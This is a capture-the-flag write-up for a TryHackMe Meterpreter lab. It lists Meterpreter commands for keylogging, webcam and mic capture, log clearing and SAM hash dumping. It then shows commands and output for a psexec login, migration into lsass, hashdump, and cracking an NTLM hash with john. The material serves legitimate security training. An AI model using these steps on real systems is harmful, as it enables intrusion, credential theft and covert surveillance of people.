# Metasploit: Meterpreter

[Metasploit: Meterpreter Room](https://tryhackme.com/room/meterpreter)

Take a deep dive into Meterpreter, and see how in-memory payloads can be used for post-exploitation.

## Meterpreter commands

Core commands:

- `background`: Backgrounds the current session
- `exit`: Terminate the Meterpreter session
- `guid`: Get the session GUID (Globally Unique Identifier)
- `help`: Displays the help menu
- `info`: Displays information about a Post module
- `irb`: Opens an interactive Ruby shell on the current session
- `load`: Loads one or more Meterpreter extensions
- `migrate`: Allows you to migrate Meterpreter to another process
- `run`: Executes a Meterpreter script or Post module
- `sessions`: Quickly switch to another session

File system commands:

- `cd`: Will change directory
- `ls`: Will list files in the current directory (dir will also work)
- `pwd`: Prints the current working directory
- `edit`: will allow you to edit a file
- `cat`: Will show the contents of a file to the screen
- `rm`: Will delete the specified file
- `search`: Will search for files
- `upload`: Will upload a file or directory
- `download`: Will download a file or directory

Networking commands:

- `arp`: Displays the host ARP (Address Resolution Protocol) cache
- `ifconfig`: Displays network interfaces available on the target system
- `netstat`: Displays the network connections
- `portfwd`: Forwards a local port to a remote service
- `route`: Allows you to view and modify the routing table

System commands:

- `clearev`: Clears the event logs
- `execute`: Executes a command
- `getpid`: Shows the current process identifier
- `getuid`: Shows the user that Meterpreter is running as
- `kill`: Terminates a process
- `pkill`: Terminates processes by name
- `ps`: Lists running processes
- `reboot`: Reboots the remote computer
- `shell`: Drops into a system command shell
- `shutdown`: Shuts down the remote computer
- `sysinfo`: Gets information about the remote system, such as OS

Others Commands (these will be listed under different menu categories in the help menu):

- `idletime`: Returns the number of seconds the remote user has been idle
- `keyscan_dump`: Dumps the keystroke buffer
- `keyscan_start`: Starts capturing keystrokes
- `keyscan_stop`: Stops capturing keystrokes
- `screenshare`: Allows you to watch the remote user's desktop in real time
- `screenshot`: Grabs a screenshot of the interactive desktop
- `record_mic`: Records audio from the default microphone for X seconds
- `webcam_chat`: Starts a video chat
- `webcam_list`: Lists webcams
- `webcam_snap`: Takes a snapshot from the specified webcam
- `webcam_stream`: Plays a video stream from the specified webcam
- `getsystem`: Attempts to elevate your privilege to that of local system
- `hashdump`: Dumps the contents of the SAM database

| Title | IP Address |
| :----: | :----: |
| Win4Meterpreter | 10.10.107.174 |

Using `msfconsole`:

```bash
db_nmap -A -vv -T4 -oN initial.nmap 10.10.107.174
```

Result: [initial.nmap](initial.nmap)

```bash
user exploit/windows/smb/psexec
hosts -R
set lhost <localhost>
set smbuser ballen
set smbpass Password1
run
```

meterpreter:

```bash
sysinfo
```

> `Computer : ACME-TEST`

> `Domain : FLASH`

```bash
background
```

`msfconsole`:

```bash
use post/windows/gather/enum_shares
set session 1
run
```

> `[*] Name: speedster`

```bash
sessions 1
```

meterpreter:

```bash
ps
```

> `756 632 lsass.exe x64 0 NT AUTHORITY\SYSTEM C:\Windows\System32\lsass.exe`

```bash
migrate 756
hashdump
```

> `jchambers:1114:aad3b435b51404eeaad3b435b51404ee:69596c7aa1e8daee17f8e78870e25a5c:::`

Copy

```bash
background
```

`msfconsole`:

```bash
cat > hash
```

Paste

```bash
john hash --wordlist=/usr/share/wordlists/rockyou.txt --format=NT
```

> `Trustno1 (?)`

```bash
sessions 1
```

meterpreter:

```bash
search -f secrets.txt
```

> `c:\Program Files (x86)\Windows Multimedia Platform\secrets.txt (35 bytes)`

```bash
cat "c:\Program Files (x86)\Windows Multimedia Platform\secrets.txt"
```

> `My Twitter password is KDSvbsw3849!`

```bash
search -f realsecret.txt
```

> `c:\inetpub\wwwroot\realsecret.txt (34 bytes)`

```bash
cat "c:\inetpub\wwwroot\realsecret.txt"
```

> `The Flash is the fastest man alive`
